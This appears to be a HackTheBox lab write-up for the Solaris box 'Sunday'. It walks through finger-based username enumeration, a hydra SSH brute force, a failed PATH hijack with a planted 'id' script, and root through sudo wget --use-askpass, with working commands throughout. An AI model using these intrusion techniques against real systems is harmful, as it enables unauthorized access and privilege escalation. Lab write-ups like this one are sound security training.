# Sunday

**Platform:** HackTheBox
**OS:** Solaris
**Tags:** Finger, User Enumeration, Brute Force, sudo, GTFOBins, Weak Credentials, Privilege Escalation
**Date:** 2026-09-08

Default nmap scan only showed three ports: finger, rpcbind, and printer. Full port scan found SSH hiding on 22022. Finger enumeration on port 79 gave two valid usernames with SSH login history. Guessed the password for `sunny` straight away. Sunny's sudo rule pointed at `/root/troll`, a dead end by design. Brute forced `sammy`'s credentials with hydra using the finger-derived usernames. Sammy had passwordless sudo on `wget`. Used the `--use-askpass` GTFOBins technique to get a root shell.

## 1. Enumeration

Started with a default service scan.

```bash
nmap -sC -sV 10.129.55.143
```

Findings:
- 79/tcp - finger
- 111/tcp - rpcbind
- 515/tcp - printer

Three ports and no SSH. Ran a full port scan to check what was hiding outside the top 1000.

```bash
nmap -p- -sV 10.129.55.143
```

- 22022/tcp - SSH, completely missed by the default scan

## 2. Finger Enumeration (port 79)

Finger gives a different response for valid versus invalid usernames. Tested manually to confirm the service was leaking account info.

```bash
echo "root" | nc -vn 10.129.55.143 79
```

```
Login       Name               TTY         Idle    When    Where
root     Super-User            console      <Dec  7, 2023>
```

Super-User as the display name for root is Solaris terminology. Confirms the OS. Ran finger-user-enum against a names wordlist to pull valid accounts.

```bash
git clone https://github.com/pentestmonkey/finger-user-enum.git
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.129.55.143
```

The daemon did loose matching - querying some names returned full lists of unrelated accounts instead of a clean no-such-user. Filtered results for accounts with a `pts`/`ssh` TTY, meaning accounts with a real interactive login history.

Findings:
- sammy - SSH login history, `pts` TTY
- sunny - SSH login history, `pts` TTY

## 3. Foothold: SSH as sunny

SSH is on 22022. Tried the box name as a password before reaching for hydra. It worked straight away.

```bash
ssh sunny@10.129.55.143 -p 22022
```

**Result:** Shell as `sunny`. user.txt was owned by `sammy` and not readable - needed to move laterally first.

## 4. Dead End: sudo /root/troll

Checked sudo permissions as sunny.

```bash
sudo -l
# (root) NOPASSWD: /root/troll
```

`/root/` wasn't traversable by sunny so the binary couldn't be inspected directly. Ran it via sudo anyway.

```bash
sudo /root/troll
# testing
# uid=0(root) gid=0(root)
```

Looked like it was calling `id` unqualified so tried a PATH hijack - placed a malicious `id` binary earlier in `$PATH` and ran it via sudo.

```bash
mkdir /tmp/.evil
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/.evil/id
chmod +x /tmp/.evil/id
export PATH=/tmp/.evil:$PATH
sudo /root/troll
```

**Result:** Failed. sudo sanitizes the environment so `$PATH` didn't carry through. The binary is called troll for a reason.

## 5. Lateral Move: SSH as sammy

The `/backups` directory referenced in other writeups didn't exist on this instance. Used the finger-derived usernames as the login list and brute forced sammy's credentials over SSH.

```bash
hydra -L names.txt -P /usr/share/wordlists/rockyou.txt ssh://10.129.55.143:22022
```

Hydra found valid credentials for sammy. SSH'd in and grabbed the user flag.

```bash
ssh sammy@10.129.55.143 -p 22022
```

**Result:** Shell as `sammy`. User flag at `/home/sammy/user.txt`.

## 6. PrivEsc: sudo wget --use-askpass

Checked sudo permissions as sammy.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/wget
```

`wget` as root with no password. The `--use-askpass` flag executes a local script to retrieve a password, which runs as root.

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/temp-file
chmod +x /tmp/temp-file
sudo /usr/bin/wget --use-askpass=/tmp/temp-file 0
```

```
whoami
# root
```

**Result:** Root shell obtained.

## 7. Flags

- User: `redacted`
- Root: `redacted`
